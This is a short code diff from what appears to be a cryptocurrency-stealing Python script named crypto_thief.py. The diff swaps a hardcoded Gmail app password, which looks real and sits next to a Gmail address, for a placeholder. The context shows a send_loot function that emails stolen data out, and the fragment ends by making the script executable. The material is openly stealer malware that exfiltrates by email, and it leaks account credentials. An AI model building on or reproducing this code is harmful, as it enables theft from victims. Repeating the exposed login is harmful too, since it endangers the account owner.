@@ -5,7 +5,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 GMAIL_USER = "balls14666@gmail.com"
-GMAIL_PASS = "qhojbcvyfapnqxip"  # ← CHANGE THIS!
+GMAIL_PASS = "googlepass"  # ← CHANGE THIS!
 
 def send_loot(to_email, subject, body):
     msg = MIMEMultipart()
@@ -91,4 +91,5 @@ while True:
 EOF
 
 chmod +x crypto_thief.py
+
 
